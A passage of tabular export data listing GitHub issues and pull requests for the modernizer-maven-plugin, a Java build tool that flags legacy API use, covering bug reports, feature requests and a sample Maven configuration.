",NA,TRUE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/20/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/20/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/20/events,https://github.com/gaul/modernizer-maven-plugin/pull/20,https://api.github.com/repos/gaul/modernizer-maven-plugin/pulls/20
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/19,53104308,MDU6SXNzdWU1MzEwNDMwOA==,19,String index out of range: -1 when there are classes with no/default package,204013,closed,FALSE,NA,NA,2,2014-12-30T09:47:29Z,2014-12-31T19:07:29Z,2014-12-31T19:07:29Z,CONTRIBUTOR,NA,"Hello :)

There is an issue with classes that have no package. [here](https://github.com/andrewgaul/modernizer-maven-plugin/blob/master/src/main/java/org/gaul/modernizer_maven_plugin/Modernizer.java#L132) it tries to get the packageName by searching the last `/` in the name but for classes that have no package there is no `/` and the `lastIndexOf`call returns `-1` resulting in the error.
",NA,FALSE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/19/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/19/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/19/events,https://github.com/gaul/modernizer-maven-plugin/issues/19,NA
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/18,52586856,MDU6SXNzdWU1MjU4Njg1Ng==,18,create source jars and deploy them to central,5379,closed,FALSE,NA,NA,2,2014-12-21T05:43:37Z,2014-12-22T17:49:13Z,2014-12-22T17:48:10Z,NONE,NA,"At the moment only pom and jar files get deployed to maven central.
http://search.maven.org/#search%7Cgav%7C1%7Cg%3A%22org.gaul%22%20AND%20a%3A%22modernizer-maven-plugin%22

source jars would be helpful, especially when debugging a crash. 
",NA,FALSE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/18/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/18/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/18/events,https://github.com/gaul/modernizer-maven-plugin/issues/18,NA
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/17,52212673,MDExOlB1bGxSZXF1ZXN0MjYyMDcyNTM=,17,Initialize ignorePackages; fixes #15,195367,closed,FALSE,NA,NA,1,2014-12-17T08:18:55Z,2014-12-17T11:33:59Z,2014-12-17T11:33:59Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/17/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/17/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/17/events,https://github.com/gaul/modernizer-maven-plugin/pull/17,https://api.github.com/repos/gaul/modernizer-maven-plugin/pulls/17
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/16,52212485,MDExOlB1bGxSZXF1ZXN0MjYyMDcxMzE=,16,Initialize ignorePackages,195367,closed,FALSE,NA,NA,1,2014-12-17T08:15:51Z,2014-12-17T08:19:09Z,2014-12-17T08:18:19Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/16/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/16/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/16/events,https://github.com/gaul/modernizer-maven-plugin/pull/16,https://api.github.com/repos/gaul/modernizer-maven-plugin/pulls/16
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/15,52211119,MDU6SXNzdWU1MjIxMTExOQ==,15,NPE in Modernizer.java:59,195367,closed,FALSE,NA,NA,3,2014-12-17T07:53:04Z,2014-12-17T12:26:33Z,2014-12-17T11:33:59Z,CONTRIBUTOR,NA,"ModernizerMojo has no default value for ignorePackages. Therefore ignorePackages is null.

A workaround is to add an empty `<ignorePackages />` definition.
",NA,FALSE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/15/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/15/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/15/events,https://github.com/gaul/modernizer-maven-plugin/issues/15,NA
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/14,51898267,MDU6SXNzdWU1MTg5ODI2Nw==,14,Accept Java version number in form of 7 and 8 instead of only 1.7 and 1.8,1093306,closed,FALSE,NA,NA,1,2014-12-13T20:16:13Z,2015-01-01T01:51:48Z,2015-01-01T01:51:48Z,NONE,NA,"Maven compiler plugin is fine with source and target versions like 7 or 8.
I want to use the same property for configuring modernizer plugin.
",NA,FALSE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/14/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/14/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/14/events,https://github.com/gaul/modernizer-maven-plugin/issues/14,NA
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/13,44492901,MDExOlB1bGxSZXF1ZXN0MjIwMzA3MTE=,13,Don't fork for the plugin execution,513280,closed,FALSE,NA,NA,5,2014-09-30T19:58:25Z,2014-10-14T13:16:36Z,2014-10-08T01:06:10Z,CONTRIBUTOR,NA,"The plugin's execution currently happens in a forked process. Not a big deal by itself, but it's not strictly necessary, and a side effect of the current setup is that it causes all build steps up to the process-test-classes phase to be executed twice. That's wasteful, and can be expensive depending on the project. (I have a project here that runs the `checker-framework` just before the `modernizer` plugin, and that's a heavy operation.)

An additional benefit of this change is that it no longer causes the plugin the fail on (sub)modules without tests. (For some reason it currently forces execution of Surefire, which then fails because neither JUnit nor TestNG are on the classpath of such test-less modules. This could be an obscure side effect of my project's setup, but still.)
",NA,TRUE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/13/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/13/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/13/events,https://github.com/gaul/modernizer-maven-plugin/pull/13,https://api.github.com/repos/gaul/modernizer-maven-plugin/pulls/13
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/12,43551466,MDExOlB1bGxSZXF1ZXN0MjE2MDgzMjE=,12,Ignore packages,25961,closed,FALSE,NA,NA,10,2014-09-22T20:55:47Z,2014-12-17T11:40:17Z,2014-12-15T12:19:15Z,CONTRIBUTOR,NA,"This feature allows ignoring some package prefixes.

This is useful when dealing with generated code.
",NA,TRUE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/12/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/12/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/12/events,https://github.com/gaul/modernizer-maven-plugin/pull/12,https://api.github.com/repos/gaul/modernizer-maven-plugin/pulls/12
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/11,43337851,MDU6SXNzdWU0MzMzNzg1MQ==,11,Modernizer uses file paths instead of class resources to resolve exclusions file,848247,closed,FALSE,NA,NA,0,2014-09-21T15:39:53Z,2014-09-21T16:29:09Z,2014-09-21T16:29:09Z,OWNER,NA,"This prevents some multi-module projects like jclouds/jclouds#529 from using Modernizer.
",NA,FALSE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/11/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/11/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/11/events,https://github.com/gaul/modernizer-maven-plugin/issues/11,NA
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/10,43321942,MDExOlB1bGxSZXF1ZXN0MjE1NDI2NDU=,10,Enable Modernizer for test classes,848247,closed,FALSE,NA,NA,3,2014-09-20T22:59:49Z,2014-09-21T10:08:01Z,2014-09-20T23:48:09Z,OWNER,NA,"Fixes #8.
",NA,TRUE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/10/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/10/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/10/events,https://github.com/gaul/modernizer-maven-plugin/pull/10,https://api.github.com/repos/gaul/modernizer-maven-plugin/pulls/10
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/9,43318611,MDExOlB1bGxSZXF1ZXN0MjE1NDExNjk=,9,Add violations for Lists.newCopyOnWriteArrayList() and Maps.newConcurrentMap(),513280,closed,FALSE,NA,NA,2,2014-09-20T20:13:40Z,2014-09-21T10:08:18Z,2014-09-20T20:22:23Z,CONTRIBUTOR,NA,"Summary says it. Consideration mentioned in the commit message:

> Note that the behavior of `Maps.newConcurrentMap()` is slightly different from `new ConcurrentHashMap<>()`: with Guava 18.0 the former creates a map with a concurrency level of 4, whereas the latter uses concurrency level 16. Most users will not care, and those that do should make this intention explicit. (This is one of the reasons that the JavaDoc for Maps.newConcurrentMap points to MapMaker.)
",NA,TRUE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/9/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/9/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/9/events,https://github.com/gaul/modernizer-maven-plugin/pull/9,https://api.github.com/repos/gaul/modernizer-maven-plugin/pulls/9
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/8,43318207,MDU6SXNzdWU0MzMxODIwNw==,8,Scanning test sources,513280,closed,FALSE,NA,NA,6,2014-09-20T19:51:53Z,2014-09-29T16:33:27Z,2014-09-20T23:47:52Z,CONTRIBUTOR,NA,"Just tried the plugin and it worked very nicely. Great initiative!

I did notice however that, by default, test classes are not scanned. Not sure whether that's on purpose, but it might be worthwhile to document (either in `README.md` or in the wiki) that one can configure the plugin to scan test classes as well. E.g.:

```
<plugin>
    <groupId>org.gaul</groupId>
    <artifactId>modernizer-maven-plugin</artifactId>
    <version>1.0.0</version>
    <executions>
        <execution>
            <id>modernize-classes</id>
            <phase>process-classes</phase>
            <goals>
                <goal>modernizer</goal>
            </goals>
        </execution>
        <execution>
            <id>modernize-test-classes</id>
            <phase>process-test-classes</phase>
            <goals>
                <goal>modernizer</goal>
            </goals>
            <configuration>
                <classFilesDirectory>${project.build.testOutputDirectory}</classFilesDirectory>
            </configuration>
        </execution>
    </executions>
    <configuration>
        <javaVersion>1.7</javaVersion>
    </configuration>
</plugin>
```

One might then also want to point out that, by moving the `javaVersion` setting inside the `execution` sections, it is possible to target different JDK versions.

NB: the plugin's default phase is _compile_. Shouldn't that be _process-classes_?
",NA,FALSE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/8/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/8/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/8/events,https://github.com/gaul/modernizer-maven-plugin/issues/8,NA
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/7,43309243,MDExOlB1bGxSZXF1ZXN0MjE1MzY4OTY=,7,Lower minimum Java version for java.util.Objects to 1.7,1790750,closed,FALSE,NA,NA,1,2014-09-20T12:28:55Z,2014-09-20T15:11:00Z,2014-09-20T15:11:00Z,CONTRIBUTOR,NA,"java.util.Objects is available in 1.7 already
",NA,TRUE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/7/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/7/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/7/events,https://github.com/gaul/modernizer-maven-plugin/pull/7,https://api.github.com/repos/gaul/modernizer-maven-plugin/pulls/7
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/6,43279157,MDU6SXNzdWU0MzI3OTE1Nw==,6,add violations for Guava Maps and Sets factories,848247,closed,FALSE,NA,NA,0,2014-09-19T20:27:26Z,2014-09-19T20:31:31Z,2014-09-19T20:31:31Z,OWNER,NA,"Similar to the existing violations for Lists factories.
",NA,FALSE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/6/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/6/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/6/events,https://github.com/gaul/modernizer-maven-plugin/issues/6,NA
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/5,43261002,MDU6SXNzdWU0MzI2MTAwMg==,5,Wrong rule for newArrayList and newLinkedList,5419905,closed,FALSE,NA,NA,7,2014-09-19T17:13:04Z,2014-09-19T18:22:53Z,2014-09-19T18:20:56Z,NONE,NA,"There is no such constructor in 1.7

``` xml
 <violation>
<name>com/google/common/collect/Lists.newArrayList:(Ljava/lang/Iterable;)Ljava/util/ArrayList;</name>
<version>1.7</version>
<comment>Prefer java.util.ArrayList&lt;&gt;(java.lang.Iterable)</comment>
</violation>
```
",NA,FALSE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/5/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/5/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/5/events,https://github.com/gaul/modernizer-maven-plugin/issues/5,NA
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/4,43094887,MDU6SXNzdWU0MzA5NDg4Nw==,4,Emit source file name in log messages,848247,closed,FALSE,NA,NA,0,2014-09-18T05:14:40Z,2014-09-21T20:31:09Z,2014-09-21T20:31:09Z,OWNER,NA,"Presently Modernizer emits the class file name instead of the source file name:

```
[ERROR] /home/gaul/work/s3proxy/target/classes/org/gaul/s3proxy/S3ProxyHandler.class:556: Prefer java.lang.Integer.valueOf(int)
```
",NA,FALSE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/4/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/4/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/4/events,https://github.com/gaul/modernizer-maven-plugin/issues/4,NA
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/3,43083964,MDU6SXNzdWU0MzA4Mzk2NA==,3,disable Modernizer via @SuppressWarnings annotation,848247,closed,FALSE,NA,NA,14,2014-09-18T01:38:01Z,2019-02-01T19:57:06Z,2019-02-01T19:57:06Z,OWNER,NA,"@SuppressWarnings allows finer-grained suppression of violations than the existing file-based mechanism.
",NA,FALSE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/3/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/3/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/3/events,https://github.com/gaul/modernizer-maven-plugin/issues/3,NA
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/2,43083378,MDU6SXNzdWU0MzA4MzM3OA==,2,violations for primitive wrapper constructors,848247,closed,FALSE,NA,NA,0,2014-09-18T01:29:46Z,2014-09-18T05:12:33Z,2014-09-18T05:12:33Z,OWNER,NA,"Modernizer could warn about use of primitive wrapper constructors, e.g., `new Integer(int)`, and recommend uses of the factory methods, e.g., `Integer.valueOf(int)`.  This duplicates FindBugs checks although provides the same functionality with lower overhead.
",NA,FALSE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/2/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/2/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/2/events,https://github.com/gaul/modernizer-maven-plugin/issues/2,NA
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/1,43081267,MDU6SXNzdWU0MzA4MTI2Nw==,1,violations for implementing legacy interfaces,848247,closed,FALSE,NA,NA,0,2014-09-18T01:00:17Z,2014-09-18T20:41:06Z,2014-09-18T20:41:06Z,OWNER,NA,"Modernizer should detect implementation of legacy interfaces, e.g.,
- `com.google.common.base.Function` instead of `java.util.function.Function`
- `com.google.common.base.Predicate` instead of `java.util.function.Predicate`
- `com.google.common.base.Supplier` instead of `java.util.function.Supplier`

This will require a different mechanism than the existing method call instrumentation, probably something like [ClassVisitor](http://asm.ow2.org/asm40/javadoc/user/org/objectweb/asm/ClassVisitor.html).
",NA,FALSE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/1/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/1/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/1/events,https://github.com/gaul/modernizer-maven-plugin/issues/1,NA
